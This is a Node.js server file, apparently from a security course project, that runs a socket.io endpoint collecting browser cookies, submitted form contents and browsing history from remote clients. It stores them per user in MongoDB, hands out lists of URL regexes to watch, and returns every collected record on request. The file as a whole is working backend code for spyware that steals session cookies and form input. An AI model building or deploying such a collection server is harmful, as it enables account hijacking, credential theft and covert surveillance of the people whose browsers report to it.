
var MongoClient = require('mongodb').MongoClient;


var assert = require('assert');
var url =  "mongodb://localhost:27017/cse509";
var COLLECTION = "browser_collection";
var form_collection = "form_collection";
var history_collection = "history_collection";
var user_collection = "user_collection";
var tmp_collection = "tmp_collection"


var insertMany = function(db, data,callback) {
   	db.collection(tmp_collection).insertMany( data, function(err, result) {
	    assert.equal(err, null);
	    console.log("Inserted a lot of things to tmp .");
	    callback();
  	});
};

var insertCookieData = function(db, data,callback) {
   	/*db.collection(COLLECTION).insertOne( data, function(err, result) {
	    assert.equal(err, null);
	    console.log("Inserted a document .");
	    callback();
  	});*/
  	

  	console.log('insertCookieData');
  	//console.log(data);
  	console.log(data.user_id);
  	var userid = data.user_id;
  	data.cookies.forEach(function(entry)
  	{
  	  	if (entry !== undefined)
  	  	{	
  	  		
	  	  	console.log(entry.cookie.domain);
	  	  	console.log(entry.cookie.name);
	  	  	console.log(entry.cookie.path)
	  	  	
	  	  	
  	  		db.collection(user_collection).update(
  			{
  				'user_id': userid,
  				'cookies.domain': entry.cookie.domain,
		  		'cookies.name': entry.cookie.name,
		  		'cookies.path': entry.cookie.path,
  			},
  			{ $set : {'last_online': Date.now(),'cookies.$': entry.cookie}},
  			//{ upsert: true },
  			function(err, nAffected, raw) {
  				//console.log(nAffected);
  				if(nAffected.result.nModified == 0){					
					console.log('inserted a new cookie');
  					console.log(entry.cookie);
  					db.collection(user_collection).updateOne(
  					{'user_id': userid},
  					{$set:{'last_online': Date.now()},$addToSet: {'cookies': entry.cookie}});
  				}
  				else{
  					console.log(nAffected.result.nModified);
  					console.log('updated an existed cookie');
  				}
  				//console.dir(raw);
  				assert.equal(err, null);
  		        //console.log("Inserted a new cookie");
  		        
  			});
  			//setTimeout(function(){
	  	  	//	//alert('hello');
	  	  	//}, 500); 
  	  	}
  	  	
  	});
  	callback(data.cookies.length);
  	
};

var insertFormData = function(db, data, callback) {
	

	console.log('insertFormData');
	console.log(data);
    db.collection(user_collection).updateOne(
    	{'user_id': data.user_id},
    	{$set:{'last_online': Date.now()}, $addToSet:{'forms':data.forms}},
    	{upsert:true}
    	);
};

var insertHistoryData = function(db, data, callback) {
	

	console.log('insertHistoryData');
	console.log(data);
	console.log(data.history);
	db.collection(user_collection).updateOne(
		{
			'user_id': data.user_id,
			'history':{
				$elemMatch:{	
					'id': data.history.id
				}
			}
		},
		{ $set : {'last_online': Date.now(),'history.$': data.history}},
		//{ upsert: true },
		function(err, nAffected, raw) {
		//console.dir(raw);
		if(nAffected.result.nModified == 0){
			console.log('inserted a new history');
			db.collection(user_collection).updateOne(
			{'user_id': data.user_id},
			{ $set:{'last_online': Date.now()}, $push: {'history': data.history}});
		}
		else{
			console.log(nAffected.result.nModified);
			console.log('updated an existed history');
		}
		assert.equal(err, null);
        //console.log("Inserted a new history");
        callback("ok");
	});
};

var insertNewUser = function(db, data, callback) {
	console.log(data.user_id);
	//console.log(data.history.length);
	//console.log(data.cookies.length);
	

	db.collection(user_collection).updateOne(
		{'user_id': data.user_id},
		data,
		{upsert: true},
		//{ upsert: true },
		function(err, nAffected, raw) {
			db.collection(user_collection).updateOne(
		  		{'user_id': data.user_id},
		  		{$set:{'last_online': Date.now()}},
		  		{upsert:true});
		});
	

	
};

var retrieveUrls = function(wurl,rurl,io,callback){
	var regdata = "";
	var urldata = ""
	var stream = wurl.find({},{ regex: 1, _id: 0}).stream();
	stream.on("data", function(item) {
		if (regdata == "")
			regdata = String(item["regex"]);
		else
			regdata += ',' + String(item["regex"]);
	});
	stream.on("end", function() {
		var stream2 = rurl.find({},{ url: 1, _id: 0}).stream();
		stream2.on("data", function(item) {
			if (urldata == "")
				urldata = String(item["url"]);
			else
				urldata += ',' + String(item["url"]);
			});
		stream2.on("end", function() {
			console.log("Data Sent:");
			var send = regdata+";"+urldata
			console.log(send);
			//io.emit('urls',send);
			callback(send);
			//socket.disconnect();
		});
	});
};


// MongoClient.connect(url, function(err, db) {
//   assert.equal(null, err);
//   insertDocument(db, function() {
//       db.close();
//   });
// });


MongoClient.connect(url, function(err, db) {
	if(!err) {
		console.log("Connected to database");
	}


	var wurl = db.collection('watchUrl');
	var rurl = db.collection('randUrl');


	var server = require('http').createServer();
	server.listen(32873, "0.0.0.0");
	var io = require('socket.io')(server);




	io.on('connection', function (socket) {
		console.log("Client In");


		socket.on('user_list', function (data,callback) {
	 		console.log("inin");
	 		db.collection(user_collection).find(/*{},{user_id: 1,last_online:1, _id: 0}*/).toArray(function(err, items) {
		        assert.equal(null, err);
		        // assert.equal(0, items.length);
		        console.log(items);
				console.log('send_back');
				callback(items);
			});
	 	});
		

		socket.on('new_install', function (data,callback) {
			console.log('new_install');
			insertNewUser(db,data, function() {
				callback('ok');
			});

		});

		/*socket.on('allcookies', function (data) {
			console.log(data);
			insertMany(db,data, function() {
			});
		});*/

		socket.on('getUrls', function(data,callback){
			console.log('getUrls Request');
			retrieveUrls(wurl,rurl,io, function(response){
				callback(response);
				db.collection(user_collection).updateOne(
			  		{'user_id': data.user_id},
			  		{$set:{'last_online': Date.now()}},
			  		{upsert:true});
			});
		});

		socket.on('submit_form', function(data,callback){
			console.log('submit_form');
			console.log(data);

			insertFormData(db, data, function(){
				callback('ok');
			});
		});		

		socket.on('history_url', function(data,callback){
			console.log('history_url');
			console.log(data);
			insertHistoryData(db,data, function(){
				callback('ok');
			});
		});

		socket.on('cookie_info', function (data,callback) {
			console.log('cookie_info');
			console.log(data);
			insertCookieData(db,data, function(response) {
				console.log(response);
				callback(response);
		          // db.close();
			});
		});
		

	});

	//server.listen(8080);
	console.log("Server Running on 32873");

});
